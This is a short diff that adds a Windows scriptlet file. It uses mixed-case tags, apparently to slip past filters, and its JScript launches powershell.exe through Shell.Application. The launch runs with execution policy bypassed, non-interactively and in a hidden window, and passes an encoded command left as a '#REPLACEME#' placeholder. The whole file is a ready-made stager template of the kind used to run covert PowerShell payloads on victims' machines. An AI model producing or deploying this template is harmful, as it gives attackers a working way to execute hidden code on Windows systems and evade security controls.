@@ -1,0 +1,3 @@
+<sCrIptlEt><scRIPt>
+a=new ActiveXObject("Shell.Application").ShellExecute("powershell.exe"," -exec bypass -Noninteractive -windowstyle hidden -e #REPLACEME#","","open","0");
+</scRIPt></sCrIptlEt>
